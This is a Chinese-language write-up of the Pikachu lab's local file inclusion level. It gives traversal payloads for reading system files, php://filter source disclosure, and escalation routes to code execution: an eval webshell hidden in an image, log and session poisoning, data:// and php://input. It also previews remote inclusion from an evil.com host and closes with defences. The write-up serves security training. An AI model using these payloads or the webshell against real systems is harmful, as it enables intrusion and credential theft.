---
layout: post
title: Pikachu - File Inclusion 本地文件包含 Writeup（include 执行与目录穿越）
platform: pikachu
date: 2026-10-29 19:12:00 +0800
categories: CTF
---

Pikachu - File Inclusion 本地文件包含 Writeup（include 执行与目录穿越）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：File Inclusion → File Inclusion(local)
- 地址：`http://localhost/pikachu/vul/fileinclude/fi_local.php`
- 题型：Web
- 考点：**本地文件包含（LFI）**、目录穿越、include 的执行特性

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
操作系统：Windows NT
allow_url_fopen   = 1
allow_url_include = （空 = Off）
open_basedir      = （未设置）
```

**页面形态**：

```text
which NBA player do you like?

[ Kobe bryant  v ]  [ 提交 ]

（选中后显示球员图片 + 介绍）
```

**作者提示**：

```html
data-content="先了解一下include()函数的用法吧"
```

**★ 下拉框只有 5 个选项**：

```html
<select name="filename">
    <option value="">--------------</option>
    <option value="file1.php">Kobe bryant</option>
    <option value="file2.php">Allen Iverson</option>
    <option value="file3.php">Kevin Durant</option>
    <option value="file4.php">Tracy McGrady</option>
    <option value="file5.php">Ray Allen</option>
</select>
```

**★ 但服务器上的 include 目录里有 6 个 php 文件**：

```
include/
├── file1.php    556 字节   ← 下拉框里有
├── file2.php    400 字节   ← 下拉框里有
├── file3.php    419 字节   ← 下拉框里有
├── file4.php    439 字节   ← 下拉框里有
├── file5.php    282 字节   ← 下拉框里有
├── file6.php    110 字节   ← ★ 下拉框里【没有】
├── ai.png / kd.png / kobe.png / ray.png / tmac.png
```

**✅ 实测结果（5 种 payload）**

| # | `filename` 参数 | 结果 |
|---|---|---|
| 1 | `file1.php` | 正常显示 Kobe 的图片 + 介绍 |
| 2 | **`file6.php`** | **`here is a secret box!` + `admin/admin` + `kobe/123456`** ✅ |
| 3 | **`../../../../Windows/win.ini`** | **win.ini 内容（`[fonts]`、`[extensions]`）** ✅ |
| 4 | **`../../../../Windows/System32/drivers/etc/hosts`** | **hosts 文件内容** ✅ |
| 5 | `../../../inc/config.inc.php` | **页面无变化（PHP 被执行了，不是显示）** |

**★ payload 2 是"隐藏彩蛋"**：

```php
// file6.php 的源码（通过 php://filter 读出来的）
<?php
$html.=<<<A
<p class=nabname>
here is a secret box!<br />
admin/admin<br />
kobe/123456<br />
</p>
A;
?>
```

**★ 下拉框里没有它，但直接传参就能包含它。**

二、题目分析

**① 漏洞代码：一行 include**

```php
<?php
// fi_local.php 第 21-29 行
if(isset($_GET['submit']) && $_GET['filename'] != null){
    $filename = $_GET['filename'];
    include "include/$filename";        // ★ 直接包含，没做任何的安全限制

//  //安全的写法,使用白名单，严格指定包含的文件名
//  if($filename=='file1.php' || $filename=='file2.php' || $filename=='file3.php' || $filename=='file4.php' || $filename=='file5.php'){
//      include "include/$filename";
//  }
}
?>
```

**★ 三个关键点**：

```
① 参数：GET 的 filename
② 语句：include "include/$filename"    ← ★ 有 "include/" 前缀
③ 过滤：完全没有
```

**★ 作者的注释已经写出了正确做法（白名单）**，但被注释掉了。

**② ⭐ 核心认知一：include 是"执行"，不是"显示"**

**★ 这是 LFI 最容易误解的地方。**

**实测证据**：

| 包含的文件 | 页面表现 | 说明 |
|---|---|---|
| `file1.php` | 显示球员介绍 | PHP 代码**执行**后 echo 出来 |
| `win.ini` | 显示 ini 内容 | 非 PHP 文件 → **原样输出** |
| `config.inc.php` | **页面无变化** | PHP 代码**执行**了，但它只有 `define()`，**没有 echo** |

**★ 为什么 `config.inc.php` 没输出？**

```php
// config.inc.php 的内容大概是这样
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPW', 'root');
...
?>
```

**★ `include` 会把它当 PHP 代码执行**：

```
define('DBPW', 'root');    ← 只是定义常量，不产生任何输出
```

**★ 所以页面看起来"没反应"，但代码其实执行了。**

**★ 这个认知至关重要**：

```
想读源码（配置文件、密码）→ 不能直接 include .php
    → 因为会被执行，而不是显示
    → 必须用 php://filter 编码（见下）

想执行代码（getshell）→ 就要 include 一个"含 PHP 代码的文件"
    → 而这个文件需要你能控制内容（上传/日志/session）
```

**③ ⭐ 核心认知二：下拉框不是防护，`file6.php` 是彩蛋**

**★ 下拉框只给了 5 个选项，看起来"限制了范围"。**

**★ 但**：

```
① 请求参数是用户可以任意修改的
② 服务器上真实存在的文件不止那 5 个
```

**★ 所以直接传 `filename=file6.php` 就拿到了"隐藏内容"**：

```
here is a secret box!
admin/admin
kobe/123456
```

**★ 这和 SQL 注入那关"下拉框不是防护"是同一类问题**：

```
前端的限制（下拉框、maxlength、disabled、正则校验）
→ 一律可以绕过（改 URL / 改 DOM / 改包）
→ 服务器只认"请求里实际带的值"
```

**★ 一个额外的启示**：

```
"开发时留下的测试文件 / 隐藏文件"
往往是渗透时的"金矿"
    file6.php、test.php、backup.sql、.git/config ...
★ 命名规则可猜（file1~file6），也可以靠目录扫描发现
```

**④ 目录穿越：`../` 到底要写几个**

**★ 路径拼接的过程**：

```php
include "include/" . "../../../../Windows/win.ini"
```

**★ 实际路径**：

```
D:\phpstudy_pro\WWW\pikachu\vul\fileinclude\include\../../../../Windows/win.ini
└──────────────┬──────────────┘└──┬──┘ └─┬─┘ └┬┘ └┬┘└──┬──┘
        当前工作目录             include  ..   ..   ..  目标文件
```

**★ 逐级解析**：

```
include\          →  fileinclude\include\
..\               →  fileinclude\
..\               →  vul\
..\               →  pikachu\
..\               →  WWW\
Windows\win.ini   →  WWW\Windows\win.ini  ← 不存在
```

**★ 但实测成功了！为什么？**

**★ Windows 的特性**：

```
Windows 对"越界的 .."是宽容的：
    如果 .. 太多，超出盘符根目录
    → 不会报错，而是"停在根目录"
    
★ 所以 WWW\..\..\..\..\Windows\win.ini
★ 实际被解析为 D:\Windows\win.ini（多余的 .. 被忽略）
```

**★ 保险写法**：

```
../../../../../../../../Windows/win.ini
★ 多写几个 .. 无害（Windows 下）
★ Linux 下也是一样（/.. = /）
```

**★ 验证一下层级（本关）**：

```
fileinclude 在 D:\phpstudy_pro\WWW\pikachu\vul\fileinclude\

要读 pikachu\inc\config.inc.php：
    include/          ← fileinclude\include\
    ../               ← fileinclude\
    ../               ← vul\
    ../               ← pikachu\        ★ 到这里才对
    inc\config.inc.php
    
→ ../../../inc/config.inc.php     （3 个 ..）
★ 实测：没报错，页面无输出（PHP 被执行了）

如果用 ../inc/config.inc.php（1 个）：
→ fileinclude\inc\config.inc.php  ← 不存在 → Warning
```

**⑤ 为什么 `php://filter` 在本关失效**

**★ 标准技巧（读 PHP 源码）**：

```
filename=php://filter/convert.base64-encode/resource=../../../inc/config.inc.php
```

**★ 目的**：

```
php://filter 会先"读取文件内容并 base64 编码"
→ base64 编码后的内容是"纯文本"，不含 <?php
→ include 时不会被当代码执行
→ 页面就能看到源码了
```

**★ 但本关失败了，实测报错**：

```
Warning: include(include/php://filter/convert.base64-encode/resource=file6.php):
         failed to open stream: No such file or directory
         └──────┬──────┘
          ★ 前缀 include/ 把协议头破坏了
```

**★ 原因**：

```php
include "include/$filename"
        └──┬──┘
    前缀让 "php://filter/..." 变成了普通相对路径
    "include/php://filter/convert.base64-encode/resource=file6.php"
    → 不是合法的 wrapper 语法 → 当普通文件找 → 找不到
```

**★ 为了确认"php://filter 本身是能用的"，我在 PHP CLI 里单独测了**：

```php
<?php
$r = include 'php://filter/convert.base64-encode/resource=D:/phpstudy_pro/WWW/pikachu/vul/fileinclude/include/file6.php';
?>
```

**★ 输出**：

```
PD9waHAKJGh0bWwuPTw8PEEKPHAgY2xhc3M9bmFibmFtZT4KaGVyZSBpcyBhIHNlY3JldCBib3ghPGJyIC8+CmFkbWluL2FkbWluPGJyIC8+CmtvYmUvMTIzNDU2PGJyIC8+CjwvcD5KQTsKPz4=
```

**★ 解码**：

```php
<?php
$html.=<<<A
<p class=nabname>
here is a secret box!<br />
admin/admin<br />
kobe/123456<br />
</p>
A;
?>
```

**★ 结论**：

```
php://filter 只在"用户能控制完整路径"时好用
★ 本关有 include/ 前缀 → 用不了
★ 这种情况下只能：
    ① 目录穿越读"非 PHP 文件"（win.ini / hosts / 日志）
    ② 直接包含"服务器上已有的 PHP 文件"（file6.php）
```

三、解题步骤

**第 1 步：正常功能**

```text
① 打开 http://localhost/pikachu/vul/fileinclude/fi_local.php
② 下拉框选 "Kobe bryant" → 点提交
③ 页面显示 Kobe 的图片 + 一段英文介绍
```

**★ 看 URL**：

```
fi_local.php?filename=file1.php&submit=提交
             └──────┬──────┘
          参数名 filename，值 file1.php
```

**第 2 步：⭐ 包含隐藏文件（本关彩蛋）**

**★ 方式 1：直接改 URL（最快）**

```
http://localhost/pikachu/vul/fileinclude/fi_local.php?filename=file6.php&submit=提交
```

**★ 预期结果**：

```text
here is a secret box!
admin/admin
kobe/123456
```

**★ 方式 2：F12 改下拉框**

```
① F12 → 元素 → 搜索 "select name"
② 双击 <option value="file1.php"> 里的 value
③ 改成 file6.php
④ 下拉框选中 → 提交
```

**★ 方式 3：控制台一行**

```javascript
document.querySelector('select[name=filename]').innerHTML='<option value="file6.php">X</option>'
```

**★ 然后点提交。**

**第 3 步：⭐ 目录穿越读系统文件**

**★ 读 win.ini**：

```
http://localhost/pikachu/vul/fileinclude/fi_local.php?filename=../../../../Windows/win.ini&submit=提交
```

**★ 页面显示**：

```ini
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

**★ 读 hosts**：

```
http://localhost/pikachu/vul/fileinclude/fi_local.php?filename=../../../../Windows/System32/drivers/etc/hosts&submit=提交
```

**★ 能看到 hosts 里的映射（`127.0.0.1 localhost` 之类）。**

**第 4 步：观察"PHP 被执行为什么没输出"**

**★ 访问**：

```
http://localhost/pikachu/vul/fileinclude/fi_local.php?filename=../../../inc/config.inc.php&submit=提交
```

**★ 结果**：页面**看起来没变化**（没有配置文件的内容）。

**★ 但代码执行了**：

```
config.inc.php 里只有 define()，没有 echo
→ 执行了，但不产生输出
★ 这就是"include 是执行不是显示"的证据
```

**★ 顺便，如果把 `../` 写少了**：

```
filename=../inc/config.inc.php      → Warning: failed to open stream
filename=../../../inc/config.inc.php → 正常（无报错）
★ 这就是"层级要数对"的证据
```

**第 5 步：完整 payload 汇总**

```
// ① 包含隐藏文件（本关彩蛋）
file6.php

// ② 目录穿越读 Windows 系统文件
../../../../Windows/win.ini
../../../../Windows/System32/drivers/etc/hosts

// ③ 读网站的 PHP（会被执行，通常无输出）
../../../inc/config.inc.php

// ④ 读日志（如果目录可访问）
../../../../Extensions/tmp/logs/...

// ⑤ 如果路径可控，用 php://filter 读源码（本关前缀导致失效）
php://filter/convert.base64-encode/resource=../../../inc/config.inc.php
```

四、延伸知识

**① LFI 的四条"升级成代码执行"路径**

**★ LFI 单独的危害是"读文件"。但如果能控制"被包含文件的内容"，就变成代码执行。**

**路径 1：文件上传 + 包含（最经典）**

```
① 上传一个"图片马"（图片里藏 PHP 代码）
   shell.png 的文件头是 PNG，但末尾有 <?php @eval($_POST[1]);?>

② 用 LFI 包含它
   ?filename=../../uploads/shell.png

★ 图片内容会被 PHP 当代码执行（因为扩展名不影响 include）
```

**★ 为什么能成**：

```
include 不检查扩展名！
include "shell.png"  ← PHP 会解析里面的 <?php ... ?> 标签
```

**路径 2：日志包含（不需要上传权限）**

```
① 访问一个"会被记录进日志"的 URL
   GET /<?php phpinfo();?> HTTP/1.1
   
② 服务器把这条请求写进 access.log
   "GET /<?php phpinfo();?> HTTP/1.1" 200 ...

③ 用 LFI 包含日志
   ?filename=../../../../apache/logs/access.log
   ★ 或者 ?filename=../../../Extensions/tmp/tmp/sess_xxx

④ phpinfo() 被执行
```

**★ 这是"无上传点"时的经典手法。**

**路径 3：session 包含**

```
① 想办法让"某个 session 变量的值"包含 PHP 代码
   （比如用户名、留言内容等）

② session 文件保存在服务器上
   Windows: D:\phpstudy_pro\Extensions\tmp\tmp\sess_<sessionid>
   Linux:   /var/lib/php/sessions/sess_<sessionid>

③ 用 LFI 包含 session 文件
   ?filename=../../../../Extensions/tmp/tmp/sess_abc123

④ 代码被执行
```

**路径 4：`php://input` / `data://`（需要 allow_url_include=On）**

```php
// php://input 读取 POST body
?filename=php://input
POST body: <?php phpinfo();?>

// data:// 直接在 URL 里带内容
?filename=data://text/plain,<?php phpinfo();?>
```

**★ 本环境的 `allow_url_include` 是 Off**：

```
实测：allow_url_include = （空）
★ 所以 php://input 和 data:// 用不了
★ 很多现代环境的默认值都是 Off
```

**② `php://filter` 的完整用法**

**★ 基础语法**：

```
php://filter/<过滤器>/resource=<目标文件>

读文件并 base64 编码（最常用）：
    php://filter/convert.base64-encode/resource=config.php

读文件并 rot13（简单混淆）：
    php://filter/string.rot13/resource=config.php

读文件并转大写：
    php://filter/string.toupper/resource=config.php
```

**★ 为什么要 base64？**

```
因为 include 会执行 <?php
但 base64 编码后的内容全是 [A-Za-z0-9+/=]
→ 没有 <?php 标签 → 不会被当代码
→ 页面直接显示 base64 字符串
★ 你拿回来解码就行
```

**★ 常用过滤器**：

| 过滤器 | 作用 |
|---|---|
| `convert.base64-encode` | base64 编码（最常用）|
| `convert.base64-decode` | base64 解码 |
| `string.rot13` | ROT13 混淆 |
| `string.toupper` / `tolower` | 大小写转换 |
| `convert.iconv.UTF-8.GBK` | 编码转换 |

**★ 一个进阶技巧：多次编码绕过 WAF**

```
php://filter/convert.base64-encode|convert.base64-encode/resource=config.php
★ 双层编码，WAF 的规则可能匹配不到
```

**③ 常见的"敏感文件"清单**

**Windows**：

```
C:\Windows\win.ini                          ← 本关用的
C:\Windows\System32\drivers\etc\hosts       ← 本关用的
C:\Windows\System32\inetsrv\config\applicationHost.config
D:\phpstudy_pro\Extensions\php\php7.3.4nts\php.ini
D:\phpstudy_pro\WWW\任意网站的\config.php
X:\...\Apache\conf\httpd.conf
```

**Linux**：

```
/etc/passwd
/etc/shadow            （需要 root 权限）
/etc/hosts
/root/.bash_history
/var/log/apache2/access.log
/var/log/nginx/access.log
/usr/local/nginx/conf/nginx.conf
/etc/php/7.4/apache2/php.ini
```

**网站自身**：

```
./index.php
../config.php
../inc/config.inc.php
./.git/config          （能拿到源码）
./.env                 （经常有数据库密码）
./backup.sql
./www.zip
```

**④ 前缀/后缀的绕过技巧（历史与现在）**

**★ 很多代码会写成**：

```php
include "include/" . $filename . ".php";
        └──┬───┘              └──┬──┘
       前缀                    后缀
```

**★ 这时候 payload 要"绕过前后缀"。**

**技巧 1：`%00` 截断（PHP < 5.3.4）**

```
?filename=../../../../Windows/win.ini%00
→ include "include/../../../../Windows/win.ini\0.php"
→ \0 之后的 ".php" 被截断
★ 老漏洞，现代 PHP 已修复（PHP 5.3.4+ 完全禁止）
```

**技巧 2：路径长度截断（Windows 260 字符 / Linux 4096）**

```
?filename=././././././...(200 个)./../../Windows/win.ini
→ 超过系统路径长度限制，后面的 ".php" 被截断
★ 只对特定版本的 PHP/系统有效
```

**技巧 3：`../` 加在前面（本关用的）**

```
?filename=../../../../Windows/win.ini
→ include "include/../../../../Windows/win.ini"
★ 直接穿越出去，前后缀都"被解析掉"了
```

**技巧 4：`php://filter` 不带后缀**

```
如果代码是 include $filename . ".php"
→ ?filename=php://filter/convert.base64-encode/resource=config
→ include "php://filter/convert.base64-encode/resource=config.php"
★ 但 resource 后面会被加上 ".php"，可能导致失败
★ 可以用 php://filter/resource=php://filter/... 套娃（高级技巧）
```

**⑤ 远程文件包含（RFI）预告**

**★ 下一关是 `File Inclusion(remote)`。**

```php
include "include/$filename";
// ?filename=http://evil.com/shell.txt
// → 直接加载攻击者服务器上的文件 → 直接 getshell
```

**★ 前提**：

```ini
; php.ini
allow_url_include = On        ; ★ 本环境是 Off
allow_url_fopen = On          ; 本环境是 On
```

**★ 本环境的实测**：

```
allow_url_fopen   = 1    ✅
allow_url_include =      ❌（空 = Off）
★ 所以本环境打不了远程包含
★ 下一关会讲怎么"手动开启"来测试
```

**⑥ 防御（三层）**

**❌ 本关的反面教材**：

```php
include "include/$filename";        // 直接包含用户输入
```

**✅ 正确做法 1：白名单（最稳，作者的注释里已经写了）**

```php
$filename = $_GET['filename'];
$allowed = ['file1.php', 'file2.php', 'file3.php', 'file4.php', 'file5.php'];
if (!in_array($filename, $allowed, true)) {
    die('非法的文件名');
}
include "include/" . $filename;
```

**★ 为什么白名单最稳**：

```
它不关心"攻击者用什么技巧"（穿越、编码、wrapper）
因为只允许"预先写死的几个值"
★ 黑名单（过滤 ../ 或 php://）永远能被绕过
```

**✅ 正确做法 2：`basename()` 去掉路径**

```php
$filename = basename($_GET['filename']);
// "../../../config.php"  →  "config.php"
include "include/" . $filename;
```

**★ 注意**：

```
basename 在 Windows 和 Linux 上对"\"和"/"的处理不同
★ 可能被 "..\..\file" 绕过
★ 所以它只是"辅助"，不是"根本"
```

**✅ 正确做法 3：映射表（ID → 文件名）**

```php
$map = ['1' => 'file1.php', '2' => 'file2.php', ...];
$id = $_GET['id'] ?? '';
if (!isset($map[$id])) die('非法');
include "include/" . $map[$id];
```

**★ 更进一步**：

```
连"文件名"都不出现在请求里
只用"数字 ID" → 攻击者连猜都没法猜
```

**✅ 正确做法 4：限制 open_basedir**

```ini
; php.ini
open_basedir = D:/phpstudy_pro/WWW/pikachu/
```

**★ 效果**：

```
即使有 LFI，也只能包含"这个目录内"的文件
→ 读不了 C:\Windows\win.ini
→ 读不了 /etc/passwd
★ 但不能阻止"包含网站内的文件"（比如 file6.php）
```

**★ 本环境 `open_basedir` 是空的** → 没有任何限制。

**⑦ 这个模块和前面模块的关系**

```
File Inclusion（本模块）
    ├── 本地包含（LFI）  ← 本题：读文件
    │       ↓
    │   配合"文件上传" → 代码执行
    │   配合"日志写入" → 代码执行
    │   配合"session"  → 代码执行
    │
    └── 远程包含（RFI）  ← 下一关：直接加载远程代码
            ↓
        直接 getshell（不需要上传）
```

**★ 一句话**：

```
LFI 是"读"的入口
RFI 是"执行"的入口
两个都是"能升级成 RCE"的高危漏洞
```

五、总结

- **本题核心：`include "include/$filename"` 直接包含用户输入 → 可以包含隐藏文件、穿越读系统文件。**

- **一行漏洞代码**：

```php
include "include/$filename";        // 前缀 + 零过滤
```

- **⭐ 八个必记要点**：

```text
① include 是"执行"不是"显示"
   包含 .php → 代码被执行（看不到源码）
   包含 .txt/.ini → 内容原样显示
   ★ config.inc.php 包含后"页面无变化"，就是因为"执行了但没输出"

② 下拉框不是防护
   请求参数可以随意改 → filename=file6.php
   ★ 本关的彩蛋就是下拉框里没有的 file6.php（admin/admin + kobe/123456）

③ 目录穿越要数对层级
   fileinclude\include\  →  ../../../  = pikachu\
   ★ Windows 下多写几个 .. 无害（停在根目录）

④ php://filter 在"有前缀"时失效
   include "include/$filename"  →  前缀破坏了 php:// 协议
   ★ 实测报错：include(include/php://filter/...): No such file
   ★ 用 CLI 单独验证过 php://filter 本身可用

⑤ php://filter 的用途
   读 PHP 源码 → base64 编码后不会被执行
   php://filter/convert.base64-encode/resource=xxx.php

⑥ LFI 能升级成代码执行
   配合文件上传（图片马）
   配合日志（把 PHP 写进 access.log）
   配合 session（把 PHP 写进 sess 文件）
   配合 php://input / data://（需 allow_url_include=On）

⑦ 本环境的限制
   allow_url_include = Off  →  php://input / data:// 用不了
   open_basedir = 空        →  没有目录限制（能穿越到 C:\）

⑧ 防御：白名单 > 映射表 > basename > open_basedir
   ★ 白名单是唯一"黑名单绕不过"的方案
```

- **实测数据**：

```text
file1.php                                        → 正常显示 Kobe
file6.php                                        → here is a secret box!
                                                   admin/admin
                                                   kobe/123456
../../../../Windows/win.ini                      → [fonts] [extensions]
../../../../Windows/System32/drivers/etc/hosts   → localhost 映射
../../../inc/config.inc.php                      → 无输出（PHP 被执行）
../inc/config.inc.php                            → Warning（层级不够）

php://filter/...resource=file6.php               → Warning（前缀破坏协议）
PHP CLI 里同样的 php://filter                     → ✅ 成功返回 base64
```

- **进度**：

```text
platform: pikachu   29 篇

├── 暴力破解      4/4    ✅
├── CSRF          3/3    ✅
├── XSS          10/10   ✅
├── SQL 注入     10/10   ✅
├── RCE           2/2    ✅
└── File Inclusion 1/2   ← 本地包含完成，还剩远程包含
```

**手工复现要点**：

```text
· 下拉框选 file1.php → 看正常页面
· 改 URL：filename=file6.php → 看到 secret box + admin/admin + kobe/123456
· 改 URL：filename=../../../../Windows/win.ini → 看到 [fonts]
· 改 URL：filename=../../../../Windows/System32/drivers/etc/hosts → 看到 localhost
· 改 URL：filename=../../../inc/config.inc.php → 页面无变化（证明"执行但不输出"）
· 试 filename=php://filter/... → 看 Warning（前缀破坏协议）
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  本地文件包含（LFI）= "让 PHP 去包含一个你没打算让它包含的文件"    │
│                                                            │
│  include "include/$filename"                               │
│      → filename=file6.php              （隐藏文件）          │
│      → filename=../../../../Windows/win.ini  （穿越读文件）   │
│                                                            │
│  ★ include 是【执行】不是【显示】                              │
│      .php  → 被执行（读不到源码）                             │
│      .ini  → 原样输出                                        │
│                                                            │
│  ★ 下拉框/前端限制都不是防护（改请求即可）                       │
│  ★ php://filter 能读 PHP 源码（但有前缀时失效）                 │
│  ★ LFI + 文件上传/日志/session → 代码执行                       │
│  ★ 防御：白名单（唯一靠得住的方案）                              │
└────────────────────────────────────────────────────────────┘
```
